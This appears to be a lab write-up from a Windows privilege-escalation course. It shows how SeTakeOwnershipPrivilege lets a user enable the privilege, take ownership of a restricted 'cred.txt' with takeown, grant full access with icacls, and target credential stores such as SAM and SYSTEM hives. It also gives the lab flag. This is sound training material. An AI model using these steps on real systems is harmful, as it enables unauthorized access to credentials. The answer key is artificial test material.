---
description: Grants a user the ability to take ownership of any "securable object,"
---

# SeTakeOwnershipPrivilege

With this privilege, a user could take ownership of any file or object and make changes that could involve access to sensitive data, `Remote Code Execution` (`RCE`) or `Denial-of-Service` (DOS).

### Leveraging the Privilege

**Reviewing Current User Privileges**

Let's review our current user's privileges.

```powershell-session
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

**Enabling SeTakeOwnershipPrivilege**

{% embed url="https://github.com/fashionproof/EnableAllTokenPrivs" %}
Use this script to enable the state
{% endembed %}

```powershell-session
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

**Choosing a Target File**

Try to find high value files that could be credentials and config files that is restricted&#x20;

Check out the target file to gather a bit more information about it.

```powershell-session
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```

**Checking File Ownership**

```powershell-session
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free
```

owner is not shown, we likely do not have enough permissions over the object to view those details.

**Taking Ownership of the File**

Now we can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary to change ownership of the file.

```powershell-session
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

**Confirming Ownership Changed**

```powershell-session
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

We are now the owner

**Modifying the File ACL**

Reading the file now won't work, we need to modify the file ACL using icacls

```powershell-session
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
```

Granting full privilege over the file.

```powershell-session
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

### When to Use?

**Files of Interest**

Some local files of interest may include:

```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

## Assessment

Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents.

<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption><p>enabling the privileges</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption><p>Change the owner since the owner is unknown (the file is still unreadable)</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption><p>Granting full privilege to the file and reading the flag 1m_th3_f1l3_0wn3r_n0W!</p></figcaption></figure>
